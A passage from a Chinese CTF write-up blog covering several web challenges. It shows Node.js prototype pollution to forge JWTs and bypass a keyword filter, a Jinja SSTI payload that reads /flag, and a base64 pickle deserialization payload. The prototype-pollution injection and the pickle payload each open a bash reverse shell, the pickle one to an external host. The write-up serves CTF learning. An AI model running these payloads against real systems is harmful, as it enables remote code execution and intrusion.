function_">check</span>(key)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_">check</span>(str[key])) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> !input.<span class="title function_">test</span>(str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>我们首先要做的第一件事就是通过<code>authenticateToken</code>，可以看到它的<code>secretKey</code>是执行这个函数并且当key不存在的时候才会生成随机的。因此我们可以先行污染<code>secretKey</code>使得其存在且可控。后续我们直接能够伪造出<code>jwt</code>通过验证(他这个merge的形式和平时的不太一样，这里可以直接像下面那样写)：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;secretKey&quot;</span><span class="punctuation">:</span><span class="string">&quot;114514&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>登录时发送过去后我们的<code>secretKey</code>就被指定为了<code>114514</code>，后续去<code>jwt.io</code>能够伪造token通过验证：</p>
<img src="/posts/10200/3.png" class title="awa">
<p>带上 <code>authorization</code> 发根路由就能触发 eval 了</p>
<img src="/posts/10200/4.png" class title="awa">
<p>下面就是waf的问题，这里可能是因为<code>merge</code>在<code>check</code>的上面，导致我们可以污染<code>check</code>绕过它的waf：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">a, b</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> c <span class="keyword">in</span> b) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(b[c]));</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">check</span>(b[c])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (a.<span class="title function_">hasOwnProperty</span>(c) &amp;&amp; b.<span class="title function_">hasOwnProperty</span>(c) &amp;&amp; <span class="keyword">typeof</span> a[c] === <span class="string">&#x27;object&#x27;</span> &amp;&amp; <span class="keyword">typeof</span> b[c] === <span class="string">&#x27;object&#x27;</span>) &#123;</span><br><span class="line">                <span class="title function_">merge</span>(a[c], b[c]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                a[c] = b[c];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(tmp_user.<span class="property">secretKey</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> check = <span class="keyword">function</span> (<span class="params">str</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> input = <span class="regexp">/const|var|let|return|subprocess|Array|constructor|load|push|mainModule|from|buffer|process|child_process|main|require|exec|this|eval|while|for|function|hex|char|base|&quot;|&#x27;|\\|\[|\+|\*/ig</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> str === <span class="string">&#x27;object&#x27;</span> &amp;&amp; str !== <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> str) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_">check</span>(key)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_">check</span>(str[key])) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> !input.<span class="title function_">test</span>(str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>污染check：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;caterpie&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;123456&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;secretKey&quot;</span><span class="punctuation">:</span> <span class="string">&quot;114514&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="string">&quot;check=(str)=&gt;true&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<img src="/posts/10200/5.png" class title="awa">
<p>最后污染code：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;caterpie&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;123456&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;secretKey&quot;</span><span class="punctuation">:</span> <span class="string">&quot;114514&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;code&quot;</span><span class="punctuation">:</span><span class="string">&quot;require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\&quot;&#x27;)&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<img src="/posts/10200/6.png" class title="awa">
<h1><span id="python口算"> Python口算</span></h1>
<p>学弟秒了，我直接抄他wp了：</p>
<p>开局脚本伺候：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">import</span> operator</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义服务器的基础 URL，请根据实际情况修改</span></span><br><span class="line">BASE_URL = <span class="string">&#x27;http://192.168.18.28/&#x27;</span>  <span class="comment"># 例如 &#x27;http://localhost:8000&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义支持的操作符</span></span><br><span class="line">operators = &#123;</span><br><span class="line">    ast.Add: operator.add,</span><br><span class="line">    ast.Sub: operator.sub,</span><br><span class="line">    ast.Mult: operator.mul,</span><br><span class="line">    ast.Div: operator.truediv,</span><br><span class="line">    ast.Pow: operator.<span class="built_in">pow</span>,</span><br><span class="line">    ast.Mod: operator.mod,</span><br><span class="line">    <span class="comment"># 如果有需要，可以添加更多操作符</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">safe_eval</span>(<span class="params">expr</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    安全地计算算术表达式，避免使用 eval 带来的安全风险</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        tree = ast.parse(expr, mode=<span class="string">&#x27;eval&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> eval_(tree.body)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;计算错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">eval_</span>(<span class="params">node</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(node, ast.Num):  <span class="comment"># 处理数字</span></span><br><span class="line">        <span class="keyword">return</span> node.n</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">isinstance</span>(node, ast.BinOp):  <span class="comment"># 处理二元操作</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(node.op) <span class="keyword">in</span> operators:</span><br><span class="line">            <span class="keyword">return</span> operators[<span class="built_in">type</span>(node.op)](eval_(node.left), eval_(node.right))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">f&quot;不支持的操作符: <span class="subst">&#123;<span class="built_in">type</span>(node.op)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">f&quot;不支持的表达式: <span class="subst">&#123;<span class="built_in">type</span>(node)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 步骤1：获取算式</span></span><br><span class="line">            calc_url = <span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/calc&quot;</span></span><br><span class="line">            response = requests.get(calc_url)</span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                expression = response.text.strip()</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;收到算式: <span class="subst">&#123;expression&#125;</span>&quot;</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 步骤2：计算算式</span></span><br><span class="line">                answer = safe_eval(expression)</span><br><span class="line">                <span class="keyword">if</span> answer <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;计算结果: <span class="subst">&#123;answer&#125;</span>&quot;</span>)</span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># 步骤3：提交答案</span></span><br><span class="line">                    submit_url = <span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/&quot;</span></span><br><span class="line">                    params = &#123;<span class="string">&#x27;answer&#x27;</span>: answer, <span class="string">&#x27;Submit&#x27;</span>: <span class="string">&#x27;提交&#x27;</span>&#125;</span><br><span class="line">                    submit_response = requests.get(submit_url, params=params)</span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">if</span> submit_response.status_code == <span class="number">200</span>:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;答案提交成功&quot;</span>)</span><br><span class="line">                        <span class="built_in">print</span>(submit_response.content)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;提交失败，状态码: <span class="subst">&#123;submit_response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;未能计算出答案&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;获取算式失败，状态码: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;发生错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 步骤4：等待1秒</span></span><br><span class="line">        <span class="comment"># time.sleep(1)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>拿到hint</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">solved=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">global</span> current_expr</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 前端计算</span></span><br><span class="line">    .....</span><br><span class="line">    .....</span><br><span class="line">    <span class="comment"># 通过计算</span></span><br><span class="line"></span><br><span class="line">    username = <span class="string">&#x27;ctfer!&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;username&#x27;</span>):</span><br><span class="line">        username = request.args.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> whitelist_filter(username,whitelist_patterns):</span><br><span class="line">            <span class="keyword">if</span> blacklist_filter(username):</span><br><span class="line">                <span class="keyword">return</span> render_template_string(<span class="string">&quot;filtered&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;你过关！&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(<span class="string">&quot;filtered&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, username=username, hint=<span class="string">&quot;f4dd790b-bc4e-48de-b717-903d433c597f&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>根据代码修改：</p>
<p>在测试绕过</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">import</span> operator</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义服务器的基础 URL，请根据实际情况修改</span></span><br><span class="line">BASE_URL = <span class="string">&#x27;http://192.168.18.28&#x27;</span>  <span class="comment"># 例如 &#x27;http://localhost:8000&#x27;</span></span><br><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line">cmd=cmd.encode(<span class="string">&#x27;utf-8&#x27;</span>).<span class="built_in">hex</span>()</span><br><span class="line">payload=<span class="string">f&#x27;&#x27;&#x27;&#123;&#123;&#123;&#123;lipsum.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(bytes.fromhex(&#x27;<span class="subst">&#123;cmd&#125;</span>&#x27;).decode()).read()&quot;)&#125;&#125;&#125;&#125;&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 定义支持的操作符</span></span><br><span class="line">operators = &#123;</span><br><span class="line">    ast.Add: operator.add,</span><br><span class="line">    ast.Sub: operator.sub,</span><br><span class="line">    ast.Mult: operator.mul,</span><br><span class="line">    ast.Div: operator.truediv,</span><br><span class="line">    ast.Pow: operator.<span class="built_in">pow</span>,</span><br><span class="line">    ast.Mod: operator.mod,</span><br><span class="line">    <span class="comment"># 如果有需要，可以添加更多操作符</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">safe_eval</span>(<span class="params">expr</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    安全地计算算术表达式，避免使用 eval 带来的安全风险</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        tree = ast.parse(expr, mode=<span class="string">&#x27;eval&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> eval_(tree.body)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;计算错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">eval_</span>(<span class="params">node</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(node, ast.Num):  <span class="comment"># 处理数字</span></span><br><span class="line">        <span class="keyword">return</span> node.n</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">isinstance</span>(node, ast.BinOp):  <span class="comment"># 处理二元操作</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(node.op) <span class="keyword">in</span> operators:</span><br><span class="line">            <span class="keyword">return</span> operators[<span class="built_in">type</span>(node.op)](eval_(node.left), eval_(node.right))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">f&quot;不支持的操作符: <span class="subst">&#123;<span class="built_in">type</span>(node.op)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">f&quot;不支持的表达式: <span class="subst">&#123;<span class="built_in">type</span>(node)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 步骤1：获取算式</span></span><br><span class="line">        calc_url = <span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/calc&quot;</span></span><br><span class="line">        response = requests.get(calc_url)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            expression = response.text.strip()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;收到算式: <span class="subst">&#123;expression&#125;</span>&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 步骤2：计算算式</span></span><br><span class="line">            answer = safe_eval(expression)</span><br><span class="line">            <span class="keyword">if</span> answer <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;计算结果: <span class="subst">&#123;answer&#125;</span>&quot;</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 步骤3：提交答案</span></span><br><span class="line">                submit_url = <span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/?answer=<span class="subst">&#123;answer&#125;</span>&amp;Submit=%E6%8F%90%E4%BA%A4&quot;</span></span><br><span class="line">                <span class="built_in">print</span>(submit_url)</span><br><span class="line">                test = &#123;</span><br><span class="line">                    <span class="string">&#x27;username&#x27;</span>: payload  </span><br><span class="line">                &#125;</span><br><span class="line">                submit_response = requests.post(submit_url,data=test)</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> submit_response.status_code == <span class="number">200</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;答案提交成功&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(submit_response.content)</span><br><span class="line">                <span class="keyword">elif</span> submit_response.status_code == <span class="number">500</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Internal Server Error&quot;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;提交失败，状态码: <span class="subst">&#123;submit_response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;未能计算出答案&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;获取算式失败，状态码: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;发生错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 步骤4：等待1秒</span></span><br><span class="line">    <span class="comment"># time.sleep(1)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h1><span id="ez_python"> ez_python</span></h1>
<p>有点脑洞+爆破的思路在里面</p>
<p>首先<code>dirsearch</code>扫出<code>/login</code>路由</p>
<img src="/posts/10200/7.png" class title="awa">
<p>接下来首先尝试<code>admin</code>账户爆破失败，但是突发奇想试试<code>test</code>用户，毕竟这用户<code>省赛</code>的时候就吃过一次亏了。结果还真有，爆出用户<code>test/123456</code></p>

<p>这是一个test用户，登录成功后可以发现有一个按钮，点一下会显示<code>不是管理员</code>，上图可以看到在登录成功后会获得一个jwt的token。因此题目暗示我们需要去修改<code>jwt</code>的token。经过上次长城杯的教训这次我们学精了，直接爆破key先，结果还真是，爆破出key为a123456。</p>
<p>去jwt.io美美修改key后重新点击按钮可以得到一串<code>unicode</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &quot;\u542c\u8bf4ser\u6709\u70b9\u4e1c\u897f&quot;</span><br><span class="line">&#x27;听说ser有点东西&#x27;</span><br></pre></td></tr></table></figure>
<p>得到新路由<code>/ser</code></p>
<p>/ser路由如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import pickle\nimport base64\ndef hhhhackme(pickled):\n    data = base64.urlsafe_b64decode(pickled)\n    deserialized = pickle.loads(data)\n\n\n    return &#x27;&#x27;, 204</span><br></pre></td></tr></table></figure>
<p>很明显是一个简单的pickle反序列化。随便找个payload都能打：</p>
<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">POST</span> <span class="string">/ser HTTP/1.1</span></span><br><span class="line"><span class="attr">Host</span>: <span class="string">192.168.18.23</span></span><br><span class="line"><span class="attr">Content-Length</span>: <span class="string">106</span></span><br><span class="line"><span class="attr">User-Agent</span>: <span class="string">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36</span></span><br><span class="line"><span class="attr">Content-Type</span>: <span class="string">application/json</span></span><br><span class="line"><span class="attr">Accept</span>: <span class="string">*/*</span></span><br><span class="line"><span class="attr">Authorization</span>: <span class="string">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTczMTExODg2OX0.OpkBoWUDun8_an51o3lNLflfsVnd4Bax8oeqcjIsQF0</span></span><br><span class="line"><span class="attr">Origin</span>: <span class="string">http://192.168.18.23</span></span><br><span class="line"><span class="attr">Referer</span>: <span class="string">http://192.168.18.23/login</span></span><br><span class="line"><span class="attr">Accept-Encoding</span>: <span class="string">gzip, deflate, br</span></span><br><span class="line"><span class="attr">Accept-Language</span>: <span class="string">zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="attr">Connection</span>: <span class="string">keep-alive</span></span><br><span class="line"></span><br><span class="line"><span class="attr">&#123;&quot;pickled&quot;</span>:<span class="string">&quot;KFMnYmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzOC4xMjcuNzQvMjMzMyAwPiYxIicKaW9zCnN5c3RlbQou&quot;&#125;</span></span><br></pre></td></tr></table></figure>
<p>vps监听，然后执行shell就过来了</p>
<h1><span id="ezlaravel"> ezlaravel</span></h1>
<p>laravel框架<code>v8.83.27</code></p>
